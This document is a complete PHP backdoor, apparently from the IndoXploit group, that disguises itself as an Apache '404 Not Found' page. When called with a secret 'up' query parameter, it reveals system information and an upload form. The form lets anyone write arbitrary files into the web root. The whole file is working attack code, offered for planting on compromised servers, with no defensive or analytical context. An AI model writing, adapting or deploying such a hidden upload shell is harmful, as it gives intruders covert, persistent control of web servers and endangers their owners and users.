<?php
if(isset($_GET['up'])){
?>
<?php
echo "Uploader by VrCy - IndoXploit<br>";

echo "<b>".php_uname()."</b><br>";

echo "<form method='post' enctype='multipart/form-data'>

	  <input type='file' name='idx_file'>

	  <input type='submit' name='upload' value='upload'>

	  </form>";

$root = $_SERVER['DOCUMENT_ROOT'];

$files = $_FILES['idx_file']['name'];

$dest = $root.'/'.$files;

if(isset($_POST['upload'])) {

	if(is_writable($root)) {

		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {

			$web = "http://".$_SERVER['HTTP_HOST']."/";

			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";

		} else {

			echo "gagal upload di document root.";

		}

	} else {

		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {

			echo "sukses upload <b>$files</b> di folder ini";

		} else {

			echo "gagal upload";

		}

	}

}
}
else{
/*-----------------------------------------------------------------------------------*/
echo "<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>

<h1>Not Found</h1>

The requested URL ";
echo $_SERVER['REQUEST_URI'];
echo "
was not found on this server.
<hr>

";
echo "<address>Apache Server at ".$_SERVER['HTTP_HOST']." Port 80</address>";
/*--------------------------------------------------------------------------------------*/
}
?>
</center>
</html>
